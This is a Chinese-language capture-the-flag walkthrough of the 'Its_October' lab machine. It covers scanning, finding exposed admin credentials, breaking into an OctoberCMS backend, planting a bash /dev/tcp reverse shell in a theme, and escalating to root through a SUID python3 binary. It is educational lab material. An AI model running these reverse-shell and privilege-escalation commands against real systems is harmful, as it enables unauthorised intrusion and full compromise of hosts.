### Its_October walkthrough

>kali	192.168.1.106
>
>靶机	192.168.1.116

1. **扫描靶机**

~~~
nmap -sC -sV -A -o october-scan.txt 192.168.1.116
~~~

发现开启了ssh,http,mysql

![image-20200420200853636](https://cdn.jsdelivr.net/gh/hyled-Ava/write_pictures/image_2020/20200420201005.png)

2. **浏览网页**

浏览了一下80端口的页面，没有发现什么有价值的东西，但在8080端口的网页按`F12`发现了一个文件

![image-20200420191336204](https://cdn.jsdelivr.net/gh/hyled-Ava/write_pictures/image_2020/20200420201006.png)

发现管理员的账号密码

![image-20200420191257169](https://cdn.jsdelivr.net/gh/hyled-Ava/write_pictures/image_2020/20200420201007.png)

3. **目录爆破**

~~~
dirb http://192.168.1.116
~~~

使用dirb对网站进行目录爆破,发现了后台登录界面，使用在8080端口网页发现的账号密码成功登录后台

![image-20200420200622648](https://cdn.jsdelivr.net/gh/hyled-Ava/write_pictures/image_2020/20200420201009.png)

进入后台，发现用的是OctoberCMS

![image-20200420200650941](https://cdn.jsdelivr.net/gh/hyled-Ava/write_pictures/image_2020/20200420201010.png)

4. **获得webshell**

进入后台后发现可以添加主题，点击cms->单击add

![image-20200420200322139](https://cdn.jsdelivr.net/gh/hyled-Ava/write_pictures/image_2020/20200420201011.png)

在code的内加入下面的反向外壳代码，但因为这个cms的问题，我们需要将代码放置到js的函数中去，使我们能的到它的webshell

~~~
 exec("/bin/bash -c 'bash -i > /dev/tcp/yourip/5000 0>&1'");
~~~

![image-20200420200241266](https://cdn.jsdelivr.net/gh/hyled-Ava/write_pictures/image_2020/20200420201012.png)

使用nc监听5000端口,在访问该链接即可获得webshell

~~~
nc -lvp 5000
~~~

![image-20200420190944606](https://cdn.jsdelivr.net/gh/hyled-Ava/write_pictures/image_2020/20200420201013.png)

5. **提权**

使用find的来查看suid权限的命令,发现有python3

~~~
find / -perm -u=s -type f 2>/dev/null
~~~

![image-20200420191020322](https://cdn.jsdelivr.net/gh/hyled-Ava/write_pictures/image_2020/20200420201014.png)

使用python3来提权

~~~python
python3 -c 'import os;os.execl("/bin/bash","sh","-p")'
~~~

![image-20200420191149225](https://cdn.jsdelivr.net/gh/hyled-Ava/write_pictures/image_2020/20200420201015.png)

参考链接

> https://gtfobins.github.io/gtfobins/python/

6. **获得flag**

进入root目录，发现proof.txt

![image-20200420191214422](https://cdn.jsdelivr.net/gh/hyled-Ava/write_pictures/image_2020/20200420200128.png)

7. **总结**

这次主要学习了用find来查找拥有suid权限的命令，以及使用python来进行提权。

